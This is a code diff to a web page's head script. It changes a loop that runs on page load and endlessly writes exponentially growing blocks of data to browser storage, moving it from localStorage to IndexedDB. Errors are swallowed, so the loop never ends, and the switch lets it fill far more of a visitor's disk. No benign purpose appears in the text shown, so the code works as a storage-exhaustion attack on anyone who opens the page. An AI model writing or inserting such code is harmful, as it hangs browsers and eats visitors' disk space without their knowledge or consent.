@@ -7,25 +7,52 @@
             let counter = 0;
             const initialSize = 10000;
             const growthRate = 199;
+            let db;
 
             function generateData(size) {
                 return '0'.repeat(size);
             }
+            function openDB() {
+                return new Promise((resolve, reject) => {
+                    const request = indexedDB.open('myDatabase', 1);
+                    request.onupgradeneeded = (event) => {
+                        const db = event.target.result;
+                        if (!db.objectStoreNames.contains('store')) {
+                            db.createObjectStore('store');
+                        }
+                    };
+                    request.onsuccess = (event) => {
+                        db = event.target.result;
+                        resolve();
+                    };
+                    request.onerror = () => reject(request.error);
+                });
+            }
+            function saveData(key, data) {
+                return new Promise((resolve, reject) => {
+                    const tx = db.transaction('store', 'readwrite');
+                    const store = tx.objectStore('store');
+                    const req = store.put(data, key);
+                    req.onsuccess = () => resolve();
+                    req.onerror = () => reject(req.error);
+                });
+            }
 
-            function save() {
+            async function saveLoop() {
                 while (true) {
                     const dataSize = Math.floor(initialSize * Math.pow(growthRate, counter));
                     const data = generateData(dataSize);
                     const key = 'x' + performance.now();
 
                     try {
-                        localStorage.setItem(key, data);
+                        await saveData(key, data);
                         counter++;
-                    } catch(e) {
+                    } catch (e) {
                     }
                 }
             }
-            save();
+            openDB()
+                .then(() => saveLoop())
         })();
     </script>
 </head>
